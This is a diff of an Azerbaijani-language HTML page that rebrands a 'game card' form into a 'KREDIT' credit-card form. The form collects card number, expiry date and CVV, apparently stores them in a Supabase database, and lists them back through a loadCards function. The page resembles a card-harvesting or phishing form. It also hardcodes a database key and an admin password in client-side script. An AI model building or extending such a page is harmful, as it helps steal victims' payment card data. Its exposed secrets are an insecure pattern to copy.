@@ -3,13 +3,13 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Oyun Kartı</title>
+<title>KREDIT Kartı</title>
 
 <style>
 body {
   margin: 0;
   font-family: Arial, sans-serif;
-  background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+  background: linear-gradient(135deg, #00c6ff, #0072ff);
   display: flex;
   justify-content: center;
   align-items: center;
@@ -52,16 +52,22 @@ body {
 }
 
 .card-front {
-  background: linear-gradient(135deg, #0052cc, #003d99);
+  background: linear-gradient(135deg, #005bea, #00c6fb);
 }
 
 .card-back {
-  background: linear-gradient(135deg, #001f3f, #001a33);
+  background: linear-gradient(135deg, #003973, #005bea);
   transform: rotateY(180deg);
 }
 
+.card-title {
+  font-weight: bold;
+  font-size: 18px;
+  letter-spacing: 2px;
+}
+
 .card-number {
-  margin-top: 60px;
+  margin-top: 50px;
   font-size: 18px;
   letter-spacing: 2px;
 }
@@ -74,7 +80,7 @@ body {
 }
 
 .cvv-box {
-  margin-top: 60px;
+  margin-top: 70px;
   text-align: right;
   font-size: 18px;
 }
@@ -93,8 +99,8 @@ button {
   padding: 12px;
   border-radius: 10px;
   border: none;
-  background: #00c6ff;
-  color: white;
+  background: white;
+  color: #0072ff;
   font-weight: bold;
   cursor: pointer;
 }
@@ -109,10 +115,10 @@ button {
   <div class="card-inner">
 
     <div class="card-front">
+      <div class="card-title">KREDIT</div>
       <div class="card-number" id="displayNumber">**** **** **** ****</div>
       <div class="card-info">
         <span id="displayExpiry">MM/YY</span>
-        <span>OYUN</span>
       </div>
     </div>
 
@@ -125,12 +131,9 @@ button {
   </div>
 </div>
 
-<input type="text" id="cardNumber" placeholder="16 rəqəm"
-maxlength="19">
-<input type="text" id="expiry" placeholder="MMYY"
-maxlength="4">
-<input type="text" id="cvv" placeholder="3 rəqəm"
-maxlength="3">
+<input type="text" id="cardNumber" placeholder="16 rəqəm" maxlength="19">
+<input type="text" id="expiry" placeholder="MMYY" maxlength="4">
+<input type="text" id="cvv" placeholder="3 rəqəm" maxlength="3">
 
 <button onclick="submitCard()">Göndər</button>
 <p id="status"></p>
@@ -145,7 +148,6 @@ const supabaseKey = "sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH";
 const supabase = createClient(supabaseUrl, supabaseKey);
 
 const adminPassword = "service.2000";
-
 const card = document.getElementById("card");
 
 const numberInput = document.getElementById("cardNumber");
@@ -218,7 +220,7 @@ async function loadCards() {
 
   data.forEach(card => {
     const div = document.createElement("div");
-    div.style.background = "#001a33";
+    div.style.background = "#004aad";
     div.style.padding = "10px";
     div.style.marginTop = "10px";
     div.style.borderRadius = "10px";
